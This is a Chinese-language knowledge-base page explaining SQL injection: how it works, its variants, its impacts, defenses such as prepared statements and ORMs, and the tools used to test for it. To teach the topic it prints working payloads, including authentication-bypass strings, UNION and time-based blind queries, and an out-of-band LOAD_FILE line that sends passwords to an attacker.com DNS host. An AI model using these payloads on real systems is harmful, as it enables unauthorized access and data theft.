---
title: SQL 注入
type: concept
tags: [cs, programming, mature]
sources: [raw/计算机/]
created: 2026-05-05
updated: 2026-05-05
summary: SQL 注入是攻击者通过未经处理的用户输入篡改 SQL 查询语义的攻击,曾是 OWASP Top 10 之首,通过 Parameterized Query / ORM 可彻底防御,但仍是工程实践中常见的高危漏洞。
---

# SQL 注入

## 定义

**SQL 注入(SQL Injection,SQLi)** 是利用应用未经处理的用户输入,把恶意 SQL 片段拼接到正常查询中,篡改原查询语义的攻击。攻击者借此读敏感数据、绕过认证、删表、植入持久后门、甚至控制数据库服务器。

SQL 注入由 Jeff Forristal 在 1998 年首次系统化披露,长期是 [[OWASP Top 10]] 第一,在 2021 版仍排第 3(因防御逐步普及而下降,但仍高发)。

## 经典示例

**不安全代码(PHP)**

```php
$user = $_POST['user'];
$pass = $_POST['pass'];
$sql = "SELECT * FROM users WHERE user='$user' AND pass='$pass'";
$result = mysqli_query($conn, $sql);
```

**攻击 payload**

```
user = admin' -- 
pass = anything
```

实际拼出的 SQL:

```sql
SELECT * FROM users WHERE user='admin' --' AND pass='anything'
```

`--` 注释掉密码检查,直接以 admin 身份登录。

## 注入类型

**1. Classic / In-Band(直接回显)**

错误信息或正常响应直接显示数据。最易利用:
```
id = 1 UNION SELECT username, password FROM users
```

**2. Blind SQLi(盲注)**

服务器不返回数据,只通过响应差异判断:
- **Boolean-based**:WHERE x=1 AND substring(password,1,1)='a' 返回 200,否则 404
- **Time-based**:WHERE x=1 AND IF(condition, SLEEP(5), 0) 看响应延迟

逐字符暴破密码,自动化工具 sqlmap 几秒搞定。

**3. Out-of-band**

数据库通过 DNS / HTTP 请求外部域名带出数据:
```
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password), '.attacker.com\\share'))
```

数据出网到攻击者 DNS 服务器。

**4. Stored / Second-Order**

恶意 payload 先存数据库,后续被另一查询拼接执行。如用户注册名 `admin'--`,日后修改密码逻辑拼接此名导致注入。

## 危害分级

- **数据泄露**:导出整库(用户、订单、密钥)
- **认证绕过**:`' OR '1'='1` 跳过密码检查
- **提权**:把 user.role 改为 'admin'
- **拖库**:导整张表
- **持久后门**:写入 webshell(MySQL into outfile)
- **横向渗透**:数据库服务器执行系统命令(xp_cmdshell on MSSQL)
- **数据破坏**:DELETE / DROP TABLE
- **DoS**:SLEEP(99999)、笛卡尔积查询

历史代价:2008 Heartland 1.34 亿信用卡、2011 索尼 PSN 1 亿账户、2017 Equifax 1.43 亿信用记录。

## 根本原因

**字符串拼接 = 把用户输入当代码**

任何"把用户输入直接拼入 SQL 字符串"的代码都有 SQL 注入风险。

错误的"修复":
- 转义引号(' → \\'):特定数据库可绕过
- 过滤关键词('union'、'select'):大小写、注释、编码可绕
- 黑名单:永远不全
- 长度限制:不能阻止短 payload

唯一根本解法:**让数据走数据通道,不走代码通道**——使用 Prepared Statement。

## 防御方法

**1. 参数化查询(Prepared Statement)**

把 SQL 模板和参数分开发送给数据库:

**Python**

```python
cursor.execute("SELECT * FROM users WHERE user=%s AND pass=%s", (user, pass))
```

**Java**

```java
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE user=? AND pass=?");
ps.setString(1, user);
ps.setString(2, pass);
```

**Node.js(mysql2)**

```javascript
conn.execute("SELECT * FROM users WHERE user=? AND pass=?", [user, pass])
```

数据库收到 SQL 模板时已编译,后续参数只当数据,无论内容多恶意都不影响 SQL 结构。

**2. ORM**

绝大多数 ORM 默认参数化:
- SQLAlchemy(Python)
- Django ORM
- Hibernate / JPA(Java)
- Eloquent(Laravel)
- Sequelize / Prisma(Node)
- ActiveRecord(Rails)

```python
User.objects.filter(username=user, password=hash_pwd)  # Django ORM 安全
```

但**注意**:ORM 中的 raw SQL 接口仍可能注入:
```python
User.objects.raw(f"SELECT * FROM users WHERE id = {id}")  # 危险
```

**3. 输入校验**

辅助手段:
- ID 类参数 → int 强转 / 正则
- 枚举类参数 → 白名单
- 长度限制
- 字符集白名单(只允许 [a-zA-Z0-9_])

**不要替代参数化**,只是纵深防御一层。

**4. 最小权限原则**

数据库账户:
- 应用账户禁用 DROP / TRUNCATE / GRANT
- 不同模块用不同账户(读 / 写分离)
- 禁用 xp_cmdshell、LOAD_FILE 等危险函数
- 限制网络出向(防 OOB)

**5. WAF**

Web Application Firewall 拦截已知 payload。**最后一层防御**,不能替代代码层防御(可绕过)。

**6. 监控与告警**

- 异常 SQL 错误率上升
- 异常长查询
- 跨表 UNION 查询
- 连接到非常规 IP

## 现代漏洞研究

**ORM 漏洞**

- Sequelize 历史 CVE(JSON 字段注入)
- Mongoose / NoSQL 注入(传 {$gt: ""} 绕过认证)
- TypeORM Raw 接口

**SSRF + SQLi**

- 通过 DB 函数发起 HTTP / DNS 请求,与 [[OWASP Top 10]] A10 SSRF 联动

**LLM 中的 SQL 注入新形态**

- AI Agent 直接生成 SQL 执行(Text2SQL)
- 用户对话内容若被拼入 SQL,等同 [[提示注入]] + SQL 注入
- 防御:Agent 生成的 SQL 经参数化或沙箱验证

## 测试与扫描

**手工测试**

输入框尝试:
- `'`、`"`、`\\`(看是否报错)
- `' OR '1'='1`、`admin'--`
- `' UNION SELECT 1,2,3 --`
- `1 AND SLEEP(5)`

**自动化工具**

- **sqlmap**:开源标杆,支持几乎所有 DB
- **Burp Suite**:商业代理,半自动
- **OWASP ZAP**:开源
- **Acunetix / Netsparker**:商业 DAST

**SAST(静态扫描)**

- SonarQube、Semgrep、CodeQL 检测代码模式
- 误报多但能发现框架未覆盖部分

## 相关漏洞家族

| 漏洞 | 原理 | 防御 |
|---|---|---|
| SQL Injection | SQL 拼接 | Prepared Statement |
| LDAP Injection | LDAP 拼接 | 转义 / 参数化 |
| NoSQL Injection | JSON 注入(MongoDB) | 严格 schema 校验 |
| ORM Injection | raw 接口 | 避免 raw SQL |
| Command Injection | shell 拼接 | 不用 shell=True / 用 args 列表 |
| XPath Injection | XPath 拼接 | 参数化 XPath |

共同根源:**用户输入混入"代码"位置**。

## 工程实践要点

- **代码审查关注**:任何 SQL 字符串拼接都是红旗
- **新人教育**:每个新工程师必读 OWASP Cheat Sheet
- **CI 集成**:SAST 扫描 + 依赖漏洞扫描([[CI_CD流水线]])
- **错误信息脱敏**:不向客户端返回 SQL 错误细节
- **生产开关**:Debug 模式禁用 stack trace 暴露

## 局限与现实

- 即使知识普及,新人仍犯
- 老旧系统遗留漏洞难修
- ORM 也有 raw 接口绕过
- 第三方库引入风险
- 多层架构中 SQL 隐藏深(如 dbt 转换层)

## 和其他概念的关系

SQL 注入是 [[OWASP Top 10]] 经典代表,与 [[XSS跨站脚本]]、[[CSRF]]、[[SSRF]] 共同构成 Web 攻击主体。它的根源(代码与数据混淆)与 [[提示注入]] 同构——都是把用户输入误当指令。

防御依赖 Prepared Statement / ORM 的工程实践,与 [[设计原则SOLID]] 中的关注点分离一脉相承。在 [[微服务]] / API 时代,SQL 注入仍是后端服务最高频高危漏洞之一,与 [[API网关]]、WAF 等防御层共同构成多层防御。

## 参考源

- raw/计算机/
- 相关:[[OWASP Top 10]]、[[Web安全]]、[[XSS跨站脚本]]
